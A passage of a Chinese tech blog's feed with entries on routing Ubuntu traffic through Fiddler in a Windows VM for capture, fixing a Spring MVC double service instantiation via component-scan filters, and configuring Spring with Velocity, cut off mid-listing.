    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>要说起抓包工具，当算顶顶大名的fiddler。<br>只是fiddler程序依赖net framework，而非跨平台工具，只能在window环境下进行抓包。</p><p>为了完成ubuntu的浏览行为被window下的fiddler抓包，可以借助虚拟机，里面安装window系统，并安装fiddler，然后开启fiddler的代理功能。</p><h2 id="设置fiddler代理"><a href="#设置fiddler代理" class="headerlink" title="设置fiddler代理"></a>设置fiddler代理</h2><p>进入fiddler options，点击Connections选项卡。<br>勾选 <strong>Allow remote computers to connect</strong>，并设置 fiddler listens on port值为8080。<br>如图所示：<br><img src="http://7xkl4i.com1.z0.glb.clouddn.com/fiddler%20proxy%20settings.png" alt="fiddler代理设置"></p><h2 id="ubuntu使用fiddler代理"><a href="#ubuntu使用fiddler代理" class="headerlink" title="ubuntu使用fiddler代理"></a>ubuntu使用fiddler代理</h2><p>打开ubuntu的网络设置，网络代理处添加HTTP代理。</p><p>如图所示：<br><img src="http://7xkl4i.com1.z0.glb.clouddn.com/ubuntu%E4%BD%BF%E7%94%A8fiddler%E4%BB%A3%E7%90%86.png" alt="ubuntu使用fiddler代理"></p><h2 id="补充说明-虚拟机网络连接"><a href="#补充说明-虚拟机网络连接" class="headerlink" title="补充说明:虚拟机网络连接"></a>补充说明:虚拟机网络连接</h2><p>如果使用虚拟机里的fiddler，则需要注意网络的连接方式为”桥接网卡”方式，这样虚拟机里的系统能分配到一个IP地址，主机能通过这个IP地址及对应的端口访问到fiddler开启的代理。</p><p>其实，只要主机能通过虚拟机IP ping通即可。</p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ol><li><a href="http://imququ.com/post/user-fiddler-on-macos.html#toc-4">回归 Windows 下的 Fiddler</a></li><li><a href="http://pengranxiang.iteye.com/blog/715829">VirtualBox虚拟机网络连接设置的四种方式</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;要说起抓包工具，当算顶顶大名的fiddler。&lt;br&gt;只是fiddler程序依赖net framework，而非跨平台工具，只能在window环境下进行抓包。&lt;/p&gt;
&lt;p&gt;为了完成ubuntu的浏览行为被window下的fiddler抓包，可以借助虚拟机，里面安装wind</summary>
      
    
    
    
    <category term="工具软件" scheme="http://yeshaoting.cn/categories/%E5%B7%A5%E5%85%B7%E8%BD%AF%E4%BB%B6/"/>
    
    
    <category term="ubuntu" scheme="http://yeshaoting.cn/tags/ubuntu/"/>
    
    <category term="fiddler" scheme="http://yeshaoting.cn/tags/fiddler/"/>
    
  </entry>
  
  <entry>
    <title>spring mvc service实例化二次问题</title>
    <link href="http://yeshaoting.cn/article/spring/spring%20mvc%20service%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%BA%8C%E6%AC%A1%E9%97%AE%E9%A2%98/"/>
    <id>http://yeshaoting.cn/article/spring/spring%20mvc%20service%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%BA%8C%E6%AC%A1%E9%97%AE%E9%A2%98/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/spring.png" class="img-logo img-center" /><p>描述：错误地spring容器配置，导致spring实例service二次。</p><h2 id="项目现状"><a href="#项目现状" class="headerlink" title="项目现状"></a>项目现状</h2><h3 id="web-xml配置"><a href="#web-xml配置" class="headerlink" title="web.xml配置"></a>web.xml配置</h3><p>web容器，首先加载spring-beans.xml配置，再加载spring-mvc.xml配置。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- The definition of the Root Spring Container shared by all Servlets and Filters --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-beans.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Creates the Spring Container shared by all Servlets and Filters --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Processes application requests --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>spring<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-mvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>spring<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="root-spring配置"><a href="#root-spring配置" class="headerlink" title="root spring配置"></a>root spring配置</h3><p><strong>期望</strong>通过注解实例化除Controller之外的对象。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.martinye.demo&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.web.bind.annotation.ControllerAdvice&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="mvc-spring配置"><a href="#mvc-spring配置" class="headerlink" title="mvc spring配置"></a>mvc spring配置</h3><p><strong>期望</strong>通过注解实例化只有Controller的对象。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.martinye.demo&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.web.bind.annotation.ControllerAdvice&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="问题小析"><a href="#问题小析" class="headerlink" title="问题小析"></a>问题小析</h2><p>通过如此配置，发现spring在加载spring-beans.xml时，实例化了一次service，再加载spring-mvc.xml时，实例化了一次controller和一次service，导致spring先后总共实例化二次service的情况发生。</p><h3 id="解析方案1"><a href="#解析方案1" class="headerlink" title="解析方案1"></a>解析方案1</h3><p>spring-mvc.xml扫描时，base-package设置更细粒度的子包。如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.martinye.demo.controller&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.web.bind.annotation.ControllerAdvice&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此配置的含义：只扫描com.martinye.demo.controller包路径下子标签指明的类型，以及<strong>默认的</strong>@Component、@ManagedBean、@Named注解类型。</p><p><strong>注</strong>：子标签与注解类型冲突，以子标签配置为准。</p><h3 id="解析方案2"><a href="#解析方案2" class="headerlink" title="解析方案2"></a>解析方案2</h3><p>设置use-default-filters值为false，其值默认为true。如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.martinye.demo&quot;</span> <span class="attr">use-default-filters</span>＝&quot;<span class="attr">false</span>&quot;&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.web.bind.annotation.ControllerAdvice&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此配置的含义：只扫描com.martinye.demo包路径下子标签指明的类型，不自动注册<strong>默认的</strong>@Component、@ManagedBean、@Named注解类型。</p><p><strong>注</strong>：子标签与注解类型冲突，以子标签配置为准。</p><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>查阅了相关文档，发现：</p><ol><li>spring<code>&lt;context:component-scan&gt;</code>标签处理逻辑会交给org.springframework.context.config.ContextNamespaceHandler处理，然后季托ComponentScanBeanDefinitionParser会读取配置文件信息并组装成org.springframework.context.annotation.ClassPathBeanDefinitionScanner进行处理。</li><li>context:component-scan的子标签，作用有先后顺序，越上面的子标签优先越高。</li><li>use-default-filters为true时，实例化ClassPathBeanDefinitionScanner时，会调用registerDefaultFilters，include @Component、@ManagedBean、@Named注解类；否则不include。之后再添加include-filter和exclude-filter里的逻辑。</li></ol><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="http://jinnianshilongnian.iteye.com/blog/1762632">context:component-scan扫描使用上的容易忽略的use-default-filters</a></li><li><a href="http://liuluo129.iteye.com/blog/1943412">spring配置中<a href="context:component-scan/">context:component-scan/</a>的use-default-filters的作用</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/spring.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;描述：错误地spring容器配置，导致spring实例service二次。&lt;/p&gt;
&lt;h2 id=&quot;项目现状&quot;&gt;&lt;a href=&quot;#项目现状&quot; class=&quot;headerlink&quot; title=&quot;项目现状&quot;&gt;&lt;/a&gt;项目现状&lt;/h2&gt;&lt;h3 id=&quot;web-xml配置&quot;&gt;&lt;a href=&quot;#web-xml配置&quot; class=&quot;headerlink&quot; title=&quot;web.xml配置&quot;&gt;&lt;/a&gt;web.xml配置&lt;/h3&gt;&lt;p&gt;web容器，首先加载spring-beans.xml配置，再加载spring-mvc.xml配置。&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;lt;!-- The definition of the Root Spring Container shared by all Servlets and Filters --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;context-param&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;param-name&lt;/span&gt;&amp;gt;&lt;/span&gt;contextConfigLocation&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;param-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;param-value&lt;/span&gt;&amp;gt;&lt;/span&gt;classpath:spring-beans.xml&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;param-value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;context-param&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;lt;!-- Creates the Spring Container shared by all Servlets and Filters --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;listener&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;listener-class&lt;/span&gt;&amp;gt;&lt;/span&gt;org.springframework.web.context.ContextLoaderListener&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;listener-class&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;listener&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;lt;!-- Processes application requests --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;servlet&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;servlet-name&lt;/span&gt;&amp;gt;&lt;/span&gt;spring&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;servlet-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;servlet-class&lt;/span&gt;&amp;gt;&lt;/span&gt;org.springframework.web.servlet.DispatcherServlet&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;servlet-class&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;init-param&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;param-name&lt;/span&gt;&amp;gt;&lt;/span&gt;contextConfigLocation&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;param-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;param-value&lt;/span&gt;&amp;gt;&lt;/span&gt;classpath:spring-mvc.xml&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;param-value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;init-param&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;load-on-startup&lt;/span&gt;&amp;gt;&lt;/span&gt;1&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;load-on-startup&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;servlet&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;servlet-mapping&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;servlet-name&lt;/span&gt;&amp;gt;&lt;/span&gt;spring&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;servlet-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;url-pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;/&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;url-pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;servlet-mapping&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
    <category term="issue" scheme="http://yeshaoting.cn/tags/issue/"/>
    
    <category term="spring" scheme="http://yeshaoting.cn/tags/spring/"/>
    
    <category term="mvc" scheme="http://yeshaoting.cn/tags/mvc/"/>
    
  </entry>
  
  <entry>
    <title>spring整合实践 - velocity</title>
    <link href="http://yeshaoting.cn/article/spring/spring%E6%95%B4%E5%90%88%E5%AE%9E%E8%B7%B5%20-%20velocity/"/>
    <id>http://yeshaoting.cn/article/spring/spring%E6%95%B4%E5%90%88%E5%AE%9E%E8%B7%B5%20-%20velocity/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/spring.png" class="img-logo img-center" /><p>此段内容说明如何整合spring与velocity。<br>此文并不介绍如何使用velocity代替jsp作为页面渲染配置(参考：VelocityAndSpringStepByStep)，仅仅只是输出特定格式的html、xml或文本等内容的整合实践。</p><h2 id="一、配置spring-mvc"><a href="#一、配置spring-mvc" class="headerlink" title="一、配置spring mvc"></a>一、配置spring mvc</h2><p>首先，web.xml添加spring容器配置:spring-beans.xml, spring-mvc.xml.</p><h2 id="velocity-engine实例化"><a href="#velocity-engine实例化" class="headerlink" title="velocity engine实例化"></a>velocity engine实例化</h2><p>对于spring父容器spring-beans.xml，除开启注解，注入配置文件等基本配置外，向容器添加velocity engine对象定义，注入velocityEngine对象。</p><p>具体配置片段如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;velocityEngine&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.ui.velocity.VelocityEngineFactoryBean&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;resourceLoaderPath&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/vm/&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;configLocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;classpath:velocity.properties&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中，将velocity模板放置在/martinye-demo-spring-velocity/src/main/webapp/WEB-INF/vm目录，将velocity.properties文件放置在/martinye-demo-spring-velocity/src/main/resources目录。<br><strong>注</strong>：vm模板也可以放置到src/main/resources目录下。</p><span id="more"></span><h2 id="二、velocity配置"><a href="#二、velocity配置" class="headerlink" title="二、velocity配置"></a>二、velocity配置</h2><p>velocity.properties配置会覆盖默认配置。<br>默认配置文件的位置：velocity.jar包路径org.apache.velocity.runtime.defaults下（velocity.properties）。</p><p>更详细参数配置可参考：configuring_resource_loaders</p><p>根据需要我们自定义的配置文件内容，如下所示：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># encoding</span></span><br><span class="line"><span class="meta">input.encoding</span>=<span class="string">UTF-8</span></span><br><span class="line"><span class="meta">output.encoding</span>=<span class="string">UTF-8</span></span><br><span class="line"><span class="attr">contentType</span>=<span class="string">text/html;charset=UTF-8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># autoreload when vm changed</span></span><br><span class="line"><span class="meta">file.resource.loader.cache</span>=<span class="string">false</span></span><br><span class="line"><span class="meta">file.resource.loader.modificationCheckInterval</span>=<span class="string">1</span></span><br><span class="line"><span class="meta">velocimacro.library.autoreload</span>=<span class="string">true</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># macro config</span></span><br><span class="line"><span class="comment"># 默认情况，velocimacro.library相对于resourceLoaderPath目录</span></span><br><span class="line"><span class="meta">velocimacro.library</span>=<span class="string">macro.vm</span></span><br><span class="line"><span class="comment">#velocimacro.permissions.allow.inline=true</span></span><br><span class="line"><span class="comment">#velocimacro.permissions.allow.inline.to.replace.global=false</span></span><br><span class="line"><span class="comment">#velocimacro.permissions.allow.inline.local.scope=false</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#layout</span></span><br><span class="line"><span 